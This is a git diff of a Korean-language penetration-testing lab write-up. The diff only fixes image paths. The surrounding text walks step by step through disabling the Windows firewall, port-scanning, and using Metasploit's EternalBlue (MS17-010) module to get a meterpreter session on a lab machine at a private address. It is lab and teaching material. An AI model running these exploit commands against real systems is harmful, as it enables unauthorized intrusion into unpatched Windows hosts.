@@ -37,7 +37,7 @@ MS17-010취약점에 대한 보안패치가 이루어지지 않은 윈도우 버
 ## 4️⃣ 취약한 윈도우 환경 세팅
 1. 제어판 -> 시스템 및 보안 -> Windows 방화벽 -> Windows 방화벽 설정 또는 해제 
 2. 방화벽 설정 모두 해제
-![방화벽](../../imgs/모의해킹/방화벽.png)
+![방화벽](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%EB%B0%A9%ED%99%94%EB%B2%BD.PNG)
 
 <br>
 
@@ -46,9 +46,9 @@ MS17-010취약점에 대한 보안패치가 이루어지지 않은 윈도우 버
 
 1. 윈도우의 IP주소 확인
 - cmd프롬프트 실행 -> ipconfig 입력
-![ipconfig](../../imgs/모의해킹/ipconfig.png)
+![ipconfig](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/ipconfig.PNG)
 2. 칼리리눅스에서 포트스캔 진행
-![PortScan](../../imgs/모의해킹/포트스캔.png)
+![PortScan](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%ED%8F%AC%ED%8A%B8%EC%8A%A4%EC%BA%94.PNG)
 445포트에 microsoft-ds가 서비스 중인 것을 확인
 3. metasploit을 통해 EternalBlue를 사용해 공격을 진행
 - msfconsole에서 eternalblue검색 후 선택
@@ -57,18 +57,18 @@ kali@kali:~$ msfconsole
 msf6 > search eternalblue
 msf6 > use 0
 ```
-![console1](../../imgs/모의해킹/콘솔1.png)
+![console1](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%EC%BD%98%EC%86%941.PNG)
 - 옵션 설정
 ```bash
 msf6 > show options
 msf6 > set RHOSTS 192.168.27.137
 ```
-![console2](../../imgs/모의해킹/콘솔2.png)
+![console2](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/%EC%BD%98%EC%86%942.PNG)
 - Exploit
 ```bash
 msf6 > exploit -j
 ```
-![exploit](../../imgs/모의해킹/exploit.png)
+![exploit](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/exploit.PNG)
 - 확인
 ```bash
 msf6 > sessions
@@ -77,8 +77,8 @@ meterpreter > cd /
 meterpreter > cd Users/minsu/Desktop
 meterpreter > mkdir hacking
 ```
-![session1](../../imgs/모의해킹/session1.png)
-![session2](../../imgs/모의해킹/session2.png)
+![session1](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/session1.PNG)
+![session2](../../imgs/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/session2.PNG)
 > 성공!!!!!!!!!!!!
 
 ***
